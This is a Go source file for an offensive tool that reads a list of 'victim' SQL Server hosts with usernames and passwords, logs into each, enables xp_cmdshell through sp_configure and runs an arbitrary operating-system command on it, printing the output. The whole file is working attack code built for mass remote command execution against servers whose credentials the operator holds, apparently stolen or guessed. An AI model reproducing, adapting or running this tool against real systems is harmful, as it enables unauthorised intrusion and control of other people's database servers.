package main

import (
	"bufio"
	"database/sql"
	"errors"
	"fmt"
	_ "github.com/denisenkom/go-mssqldb"
	"io"
	"log"
	"os"
	"regexp"
	"strings"
	"sync"
)

type victim struct {
	host string
	port string
	user string
	pwd  string
}

func TargetsLoad(filename string) ([]victim, error) {
	fd, err := os.Open(filename)
	if err != nil {
		return nil, errors.New(err.Error())
	}
	defer fd.Close()

	reg := regexp.MustCompile(`^(((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})){3})----((6[0-4]\d{3}|65[0-4]\d{2}|655[0-2]\d|6553[0-5])|[0-5]?\d{0,4})----(.+)----(.+)$`)
	if reg == nil {
		log.Println("regexp err.")
		return nil, errors.New("regexp err.")
	}

	rd := bufio.NewReader(fd)
	var victims []victim
	for {
		line, _, err := rd.ReadLine()
		if err != nil {
			if err == io.EOF {
				break
			}
			log.Println(err.Error())
		}
		matches := reg.FindAllString(string(line), -1)
		if len(matches) == 0 {
			continue
		}
		splitRes := strings.Split(string(line), "----")
		victims = append(victims, victim{host: splitRes[0], port: splitRes[1], user: splitRes[2], pwd: splitRes[3]})
	}
	return victims, nil
}

func Xp_cmdshell(taget victim, command string, group *sync.WaitGroup, ch chan bool) {
	defer group.Done()
	defer func() {
		<-ch
	}()
	connString := fmt.Sprintf("server=%s;port=%s;user id=%s;password=%s;database=master;encrypt=disable;connection timeout=3;dial timeout=3;",
		taget.host,
		taget.port,
		taget.user,
		taget.pwd)

	conn, err := sql.Open("mssql", connString)
	if err != nil {
		log.Println(fmt.Sprintf("[%s]", taget.host), err.Error())
		return
	}
	defer conn.Close()

	stmt, err := conn.Prepare(`EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;`)
	if err != nil {
		log.Println(fmt.Sprintf("[%s]", taget.host), err.Error())
		return
	}
	defer stmt.Close()

	_, err = stmt.Exec()
	if err != nil {
		log.Println(fmt.Sprintf("[%s]", taget.host), err.Error())
		return
	}

	stmt, err = conn.Prepare(fmt.Sprintf(`exec master..xp_cmdshell ?;`))
	if err != nil {
		log.Println(fmt.Sprintf("[%s]", taget.host), err.Error())
		return
	}
	defer stmt.Close()

	rows, err := stmt.Query(command)
	if err != nil {
		log.Println(fmt.Sprintf("[%s]", taget.host), err.Error())
		return
	}
	defer rows.Close()

	var row interface{}
	var build strings.Builder
	for rows.Next() {
		if err = rows.Scan(&row); err != nil {
			log.Println(fmt.Sprintf("[%s]", taget.host), err.Error())
			return
		}
		if row == nil {
			continue
		}
		build.WriteString(row.(string))
	}
	log.Println(fmt.Sprintf("[%s]", taget.host), build.String())
	return
}
